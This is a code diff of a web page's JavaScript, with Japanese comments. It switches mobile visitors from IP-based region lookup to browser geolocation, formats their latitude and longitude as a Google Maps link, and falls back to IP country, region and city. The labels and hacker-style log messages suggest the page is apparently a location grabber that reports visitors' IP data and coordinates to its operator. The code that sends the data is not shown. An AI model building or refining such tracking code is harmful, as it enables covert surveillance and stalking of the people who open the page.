@@ -58,7 +58,6 @@
             }
         }
 
-        // スマホかどうかを判定する関数（画面の幅やタッチ操作、プラットフォームから自動判定）
         function isMobileDevice() {
             const ua = navigator.userAgent;
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);
@@ -90,14 +89,27 @@
                 let locationFieldTitle = "🛰️ GPS位置情報";
                 let locationText = "";
 
-                // スマホとPCで処理を自動分岐
+                // スマホとPCの処理
                 if (isMobileDevice()) {
-                    addLog("> スマホ環境を検出: IPベースの地域情報を構築中...");
-                    const country = ipData.country_name || "不明";
-                    const region = ipData.region || "不明";
-                    const city = ipData.city || "不明";
-                    locationFieldTitle = "📍 地域（スマホ・IP推定）";
-                    locationText = `${country} / ${region} / ${city}`;
+                    addLog("> スマホ環境を検出: 周辺エリア座標を要求中...");
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: false, // あえて高精度をオフにすることで、巨大なズレを防ぎ安定したエリアを取る
+                                timeout: 6000,
+                                maximumAge: 60000
+                            });
+                        });
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        locationFieldTitle = "📍 地域（スマホ・周辺エリア）";
+                        locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(※IPとスマホ基地局による周辺エリア)`;
+                    } catch (e) {
+                        locationFieldTitle = "📍 地域（IP推定エリア）";
+                        locationText = `${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
+                    }
                 } else {
                     addLog("> PC環境を検出: 高精度GPS座標を要求中...");
                     try {
